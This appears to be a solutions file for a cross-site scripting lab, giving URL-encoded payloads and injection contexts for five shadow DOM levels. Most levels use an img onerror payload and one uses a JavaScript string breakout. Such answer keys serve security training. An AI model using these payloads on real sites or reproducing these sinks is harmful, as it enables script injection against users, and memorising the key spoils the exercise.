# shadow-dom — solutions

Open/closed shadow root sinks. Scripts inside shadow innerHTML do not execute, but `<img onerror>` / `<svg onload>` do.

### shadow-dom-level1

`/shadow-dom/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: open shadow root `.innerHTML = '<div>...</div>'`

### shadow-dom-level2

`/shadow-dom/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: closed shadow root innerHTML; same sink

### shadow-dom-level3

`/shadow-dom/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: light DOM reflection then slotted into shadow

### shadow-dom-level4

`/shadow-dom/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: declarative shadow DOM template; img onerror fires

### shadow-dom-level5

`/shadow-dom/level5/?query=%27%29%3Balert%281%29%2F%2F`

- payload: `');alert(1)//`
- context: the value is reflected raw into the single-quoted JS string argument
  of `sheet.replaceSync('...')`, so it never has to be valid CSS — close the
  string and the statement, then run code. `replaceSync`'s CSS-only semantics
  never come into play because the breakout happens before the call.
  Verified in Chrome 150. (This entry previously claimed the level was
  protected; it is not.)
